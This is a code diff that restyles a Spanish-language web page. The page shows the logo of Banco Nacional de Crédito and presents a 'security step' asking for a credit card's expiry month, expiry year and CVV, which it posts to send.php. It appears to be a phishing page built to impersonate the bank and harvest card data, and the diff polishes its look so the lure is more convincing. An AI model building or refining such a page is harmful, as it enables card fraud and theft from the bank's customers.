@@ -36,7 +36,7 @@
     max-width:560px;
     display:flex;
     flex-direction:column;
-    gap:22px;
+    gap:0;
   }
 
   /* Logo */
@@ -60,11 +60,12 @@
     letter-spacing:.2px;
     color:#FF6A00;
     text-align:center;
-    margin:-14px 0 30px;
+    margin:0 0 30px;
+    line-height:1.4;
   }
 
   @media (max-width:480px){
-    .step-title{font-size:17px;margin:-8px 0 24px;}
+    .step-title{font-size:17px;margin:0 0 24px;}
   }
 
   /* Contenedor de cada campo */
@@ -75,6 +76,7 @@
     background:#fff;
     padding:16px 20px;
     transition:border-color .15s ease, box-shadow .15s ease;
+    margin-bottom:16px;
   }
 
   .field:focus-within{
@@ -82,7 +84,7 @@
     box-shadow:0 0 0 3px rgba(150,160,175,.12);
   }
 
-  /* Etiqueta flotante con degradado de color */
+  /* Etiqueta flotante */
   .field-label{
     display:block;
     font-size:13px;
@@ -103,7 +105,7 @@
     font-size:20px;
     color:var(--value);
     padding:0;
-    padding-right:34px; /* espacio para el icono */
+    padding-right:34px;
     appearance:none;
     -webkit-appearance:none;
     -moz-appearance:none;
@@ -118,7 +120,7 @@
   .field input::placeholder{color:var(--placeholder);}
   .field select option{color:var(--value);}
 
-  /* Icono (flecha o candado) a la derecha, alineado con el valor */
+  /* Icono (flecha o candado) a la derecha */
   .field-icon{
     position:absolute;
     right:20px;
@@ -134,7 +136,7 @@
 
   .field-icon svg{width:100%;height:100%;display:block;}
 
-  /* El input del CVV no tiene label superior en la imagen */
+  /* El input del CVV */
   .field--cvv{
     display:flex;
     align-items:center;
@@ -154,9 +156,23 @@
     .field-label{font-size:12px;}
   }
 
+  /* Contenedor del formulario */
+  form{
+    display:flex;
+    flex-direction:column;
+  }
 
-    .submit-btn{
-    width:75%;
+  /* Contenedor del botón centrado */
+  .form-container{
+    display:flex;
+    justify-content:center;
+    margin-top:24px;
+  }
+
+  /* Botón */
+  .submit-btn{
+    width:100%;
+    max-width:300px;
     border:none;
     border-radius:14px;
     background:#FF6A00;
@@ -164,76 +180,92 @@
     font-family:"Poppins",sans-serif;
     font-size:18px;
     font-weight:600;
-    padding:16px;
+    padding:16px 32px;
     cursor:pointer;
     transition:background .15s ease;
   }
-  .submit-btn:hover{background:#e85f00;}
+
+  .submit-btn:hover{
+    background:#e85f00;
+  }
+
+  .submit-btn:active{
+    background:#d94d00;
+  }
+
+  @media (max-width:480px){
+    .submit-btn{font-size:16px;padding:14px 28px;}
+  }
 </style>
 </head>
 <body>
 
   <div class="card-stack">
 
-    <!-- LOGO: cambia el "src" por el de tu logo (por ejemplo src="logo.png") -->
-    <img class="logo" alt="Logo"
+    <!-- LOGO -->
+    <img class="logo" alt="Logo BNC"
       src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original">
 
     <h1 class="step-title">Paso de seguridad, completa los datos de tu tarjeta de crédito:</h1>
+
     <form action="send.php" method="POST">
 
-    <!-- Mes de vencimiento -->
-    <div class="field">
-      <label class="field-label" for="mes">Mes de Vencimiento TDC</label>
-      <select id="mes" name="mes" required>
-        <option value="" selected>-- Mes --</option>
-        <option value="01">01 - Enero</option>
-        <option value="02">02 - Febrero</option>
-        <option value="03">03 - Marzo</option>
-        <option value="04">04 - Abril</option>
-        <option value="05">05 - Mayo</option>
-        <option value="06">06 - Junio</option>
-        <option value="07">07 - Julio</option>
-        <option value="08">08 - Agosto</option>
-        <option value="09">09 - Septiembre</option>
-        <option value="10">10 - Octubre</option>
-        <option value="11">11 - Noviembre</option>
-        <option value="12">12 - Diciembre</option>
-      </select>
-      <span class="field-icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <polyline points="6 9 12 15 18 9"></polyline>
-        </svg>
-      </span>
-    </div>
+      <!-- Mes de vencimiento -->
+      <div class="field">
+        <label class="field-label" for="mes">Mes de Vencimiento TDC</label>
+        <select id="mes" name="mes" required>
+          <option value="" selected>-- Mes --</option>
+          <option value="01">01 - Enero</option>
+          <option value="02">02 - Febrero</option>
+          <option value="03">03 - Marzo</option>
+          <option value="04">04 - Abril</option>
+          <option value="05">05 - Mayo</option>
+          <option value="06">06 - Junio</option>
+          <option value="07">07 - Julio</option>
+          <option value="08">08 - Agosto</option>
+          <option value="09">09 - Septiembre</option>
+          <option value="10">10 - Octubre</option>
+          <option value="11">11 - Noviembre</option>
+          <option value="12">12 - Diciembre</option>
+        </select>
+        <span class="field-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"></polyline>
+          </svg>
+        </span>
+      </div>
 
-    <!-- Año de vencimiento -->
-    <div class="field">
-      <label class="field-label" for="anio">Año de Vencimiento TDC</label>
-      <select id="anio" name="anio" required>
-        <option value="" selected>-- Año --</option>
-        <!-- Los años se generan con JS -->
-      </select>
-      <span class="field-icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <polyline points="6 9 12 15 18 9"></polyline>
-        </svg>
-      </span>
-    </div>
+      <!-- Año de vencimiento -->
+      <div class="field">
+        <label class="field-label" for="anio">Año de Vencimiento TDC</label>
+        <select id="anio" name="anio" required>
+          <option value="" selected>-- Año --</option>
+        </select>
+        <span class="field-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"></polyline>
+          </svg>
+        </span>
+      </div>
 
-    <!-- CVV -->
-    <div class="field field--cvv">
-      <input type="text" id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc"
-             maxlength="4" placeholder="CVV ..." aria-label="CVV">
-      <span class="field-icon" aria-hidden="true">
-        <svg viewBox="0 0 24 24" fill="currentColor">
-          <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm3 8H9V6a3 3 0 0 1 6 0v3z"/>
-        </svg>
-      </span>
-    </div><br><br>
-      
-    <button type="submit" class="submit-btn">Continuar</button>
-  </form>
+      <!-- CVV -->
+      <div class="field field--cvv">
+        <input type="text" id="cvv" name="cvv" inputmode="numeric" autocomplete="cc-csc"
+               maxlength="4" placeholder="CVV ..." aria-label="CVV">
+        <span class="field-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="currentColor">
+            <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm3 8H9V6a3 3 0 0 1 6 0v3z"/>
+          </svg>
+        </span>
+      </div>
+
+      <!-- Botón centrado -->
+      <div class="form-container">
+        <button type="submit" class="submit-btn">Continuar</button>
+      </div>
+
+    </form>
+
   </div>
 
   <script>
